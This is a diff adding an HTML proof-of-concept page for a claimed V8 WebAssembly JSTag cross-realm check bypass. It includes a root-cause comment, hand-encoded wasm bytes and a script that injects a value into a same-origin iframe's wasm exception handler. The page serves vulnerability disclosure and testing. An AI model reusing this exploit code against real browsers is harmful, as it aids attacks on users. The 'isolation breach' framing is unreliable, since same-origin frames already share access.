@@ -1,0 +1,245 @@
+<!--
+  V8 WebAssembly JSTag Cross-Realm Bypass
+  File:   src/wasm/wasm-js.cc:2177
+  CWE-284 (Improper Access Control) / cross-realm isolation bypass
+
+  Root cause
+  ----------
+  WebAssembly.Exception constructor checks whether a tag is the JSTag:
+
+    wasm-js.cc:2177 (approx):
+      if (tag->WasmExceptionTag() == isolate->wasm_js_tag()) { ... }
+
+  The comparison is a same-object identity check against the CURRENT context's
+  wasm_js_tag(). When `tag` (T) is frames[0].WebAssembly.JSTag (a different
+  context/realm), T != isolate->wasm_js_tag(), so the check body does not fire
+  and the cross-realm Exception is constructed without TypeError.
+
+  Forbidden state
+  ---------------
+  The JS API requires that a WebAssembly.Exception created with JSTag must
+  belong to the same realm as the JSTag used. After the bypass:
+    e = new WebAssembly.Exception(iframeJSTag, [attackerValue])
+    e.is(iframeJSTag) === true          // main realm holds a valid cross-realm exception
+    e.getArg(iframeJSTag, 0) === v      // payload accessible cross-realm
+
+  Wasm chain
+  ----------
+  When e is thrown through a wasm try/catch in the iframe realm whose catch
+  clause references iframeJSTag, the handler receives attackerValue as the
+  "thrown JS object" while the object in flight is the cross-realm Exception e.
+  Main realm thereby injects an arbitrary value into iframe realm's wasm
+  exception-handling flow — an isolation breach.
+
+  Wasm module binary (decoded)
+  ----------------------------
+  (module
+    (import "m" "t"  (tag $t (param externref)))  ; iframeJSTag
+    (import "m" "fn" (func $fn))                  ; thrower: () -> ()
+    (func (export "run") (result externref)
+      try (result externref)
+        call $fn          ; throws `e` from JS
+        ref.null extern   ; unreachable fallback if no throw
+      catch $t            ; extracts externref payload from JSTag exception
+      end
+    )
+  )
+
+  Run
+  ---
+  Open in Chrome (any version supporting WebAssembly.Exception / JSTag).
+  No flags required. Same-origin iframe is auto-created (about:blank).
+-->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>JSTag Cross-Realm PoC</title>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    background: #0d1117; color: #e6edf3;
+    font-family: 'Cascadia Code', 'JetBrains Mono', 'Consolas', monospace;
+    font-size: 13px; line-height: 1.6; margin: 0;
+    padding: 24px max(16px, env(safe-area-inset-left,0px));
+  }
+  h1 { font-size: 14px; color: #58a6ff; margin: 0 0 2px; }
+  .sub { color: #8b949e; font-size: 11px; margin-bottom: 20px; }
+  #out {
+    background: #161b22; border: 1px solid #30363d;
+    border-radius: 6px; padding: 16px; white-space: pre-wrap;
+    min-height: 120px;
+  }
+  .ok   { color: #3fb950; }
+  .bug  { color: #f85149; font-weight: 600; }
+  .safe { color: #3fb950; font-weight: 600; }
+  .info { color: #8b949e; }
+  .warn { color: #d29922; }
+</style>
+</head>
+<body>
+<h1>V8 wasm-js.cc:2177 — JSTag Cross-Realm Bypass</h1>
+<div class="sub">CWE-284 · same-origin iframe · no flags required</div>
+<div id="out"></div>
+
+<!-- Same-origin blank iframe for cross-realm access -->
+<iframe id="f" src="about:blank" style="display:none"></iframe>
+
+<script>
+// ── Wasm module binary ────────────────────────────────────────────────────────
+// Hand-encoded from the WAT above.
+//
+// Type section (3 types):
+//   type 0: () -> ()                   -- for $fn
+//   type 1: () -> (externref)          -- for run
+//   type 2: (externref) -> ()          -- for tag $t
+//
+// Import section:
+//   "m"."t"  : tag,  attr=0, type=2
+//   "m"."fn" : func, type=0
+//
+// Function section:  1 function, type=1
+// Export section:    "run" = func 1
+// Code section:
+//   try (result externref)
+//     call 0       ; $fn
+//     ref.null extern
+//   catch 0        ; $t
+//   end
+const WASM_BYTES = new Uint8Array([
+  /* header   */ 0x00,0x61,0x73,0x6d, 0x01,0x00,0x00,0x00,
+  /* type     */ 0x01,0x0c, 0x03,
+                   0x60,0x00,0x00,
+                   0x60,0x00,0x01,0x6f,
+                   0x60,0x01,0x6f,0x00,
+  /* import   */ 0x02,0x0f, 0x02,
+                   0x01,0x6d, 0x01,0x74, 0x04,0x00,0x02,
+                   0x01,0x6d, 0x02,0x66,0x6e, 0x00,0x00,
+  /* function */ 0x03,0x02, 0x01,0x01,
+  /* export   */ 0x07,0x07, 0x01, 0x03,0x72,0x75,0x6e, 0x00,0x01,
+  /* code     */ 0x0a,0x0c, 0x01, 0x0a,0x00,
+                   0x06,0x6f,       // try (result externref)
+                   0x10,0x00,       // call $fn
+                   0xd0,0x6f,       // ref.null extern
+                   0x07,0x00,       // catch $t
+                   0x0b,            // end
+]);
+
+// ── Output helpers ────────────────────────────────────────────────────────────
+const out = document.getElementById('out');
+function emit(cls, text) {
+  const s = document.createElement('span');
+  s.className = cls;
+  s.textContent = text + '\n';
+  out.appendChild(s);
+}
+const ok   = t => emit('ok',   '[PASS]  ' + t);
+const bug  = t => emit('bug',  '[BUG!]  ' + t);
+const safe = t => emit('safe', '[SAFE]  ' + t);
+const info = t => emit('info', '        ' + t);
+const warn = t => emit('warn', '[WARN]  ' + t);
+const sep  = ()  => emit('info', '');
+
+async function runPoC() {
+  emit('info', '=== V8 JSTag Cross-Realm Bypass PoC ===');
+  sep();
+
+  // ── Prerequisite checks ───────────────────────────────────────────────────
+  if (typeof WebAssembly?.Exception === 'undefined' ||
+      typeof WebAssembly?.JSTag     === 'undefined') {
+    warn('WebAssembly.Exception / JSTag unavailable.');
+    warn('Requires Chrome 95+ (or --experimental-wasm-eh in older V8).');
+    return;
+  }
+
+  // ── Step 1: Confirm different JSTag objects across realms ─────────────────
+  info('Step 1: Cross-realm JSTag identity');
+  const iframe = document.getElementById('f');
+  const iWA = iframe.contentWindow?.WebAssembly;
+  if (!iWA?.JSTag) { warn('iframe WebAssembly.JSTag unavailable'); return; }
+
+  const T    = iWA.JSTag;         // iframe realm's JSTag
+  const mainT = WebAssembly.JSTag; // main realm's JSTag
+  info(`  mainRealm.JSTag   = ${mainT}`);
+  info(`  iframeRealm.JSTag = ${T}`);
+
+  if (T === mainT) {
+    info('  Realms share JSTag — may be patched or single-context.'); return;
+  }
+  ok('T !== mainT — distinct realm JSTag objects confirmed');
+  sep();
+
+  // ── Step 2: Attempt cross-realm Exception construction (the bypass) ───────
+  info('Step 2: new WebAssembly.Exception(iframeJSTag, [v])');
+  info('  wasm-js.cc:2177 should fire TypeError for cross-realm JSTag.');
+  info('  If it compares against isolate->wasm_js_tag() (main realm), it misses.');
+
+  const attackerValue = { origin: 'main', marker: 0xdeadbeef };
+  let e;
+  try {
+    e = new WebAssembly.Exception(T, [attackerValue]);
+    bug('No TypeError — check at wasm-js.cc:2177 did not fire!');
+    bug('Exception created with cross-realm JSTag (forbidden state).');
+  } catch (ex) {
+    if (ex instanceof TypeError) {
+      safe('TypeError thrown — wasm-js.cc:2177 correctly rejected cross-realm JSTag.');
+      info('  ' + ex.message);
+      return;
+    }
+    warn('Unexpected: ' + ex); return;
+  }
+  sep();
+
+  // ── Step 3: Demonstrate the forbidden state ───────────────────────────────
+  info('Step 3: Verify forbidden state');
+  if (e instanceof WebAssembly.Exception)
+    bug('e instanceof WebAssembly.Exception === true (cross-realm exception exists)');
+  if (e.is(T))
+    bug('e.is(iframeJSTag) === true (main realm holds a valid cross-realm exception)');
+
+  try {
+    const got = e.getArg(T, 0);
+    if (got === attackerValue)
+      bug('e.getArg(iframeJSTag, 0) === attackerValue (payload accessible cross-realm)');
+  } catch (ex) {
+    info('  getArg threw: ' + ex.message);
+  }
+  sep();
+
+  // ── Step 4: Wasm chain — inject through iframe try/catch ─────────────────
+  info('Step 4: Throw cross-realm exception through iframe wasm try/catch');
+  info('  wasm module imports iframeJSTag as $t and $fn as the thrower');
+  info('  run() calls $fn inside try/catch $t → receives externref payload');
+
+  try {
+    const mod  = await WebAssembly.compile(WASM_BYTES.buffer);
+    let eToThrow = e;
+    const inst = await WebAssembly.instantiate(mod, {
+      m: { t: T, fn: () => { throw eToThrow; } }
+    });
+
+    const result = inst.exports.run();
+    sep();
+    if (result === attackerValue) {
+      bug('wasm catch received attackerValue — NOT the exception object e!');
+      bug('Thrown:  WebAssembly.Exception e (instanceof=' +
+          (e instanceof WebAssembly.Exception) + ')');
+      bug('Caught:  ' + JSON.stringify(result));
+      bug('CONFIRMED: main realm injected value into iframe wasm exception handler.');
+    } else {
+      info('  wasm returned (unexpected): ' + result);
+    }
+  } catch (wasmErr) {
+    info('  wasm instantiation/run error: ' + wasmErr);
+    info('  (VM may require --experimental-wasm-eh or may already be patched)');
+  }
+
+  sep();
+  emit('info', '=== PoC complete ===');
+}
+
+window.addEventListener('load', runPoC);
+</script>
+</body>
+</html>
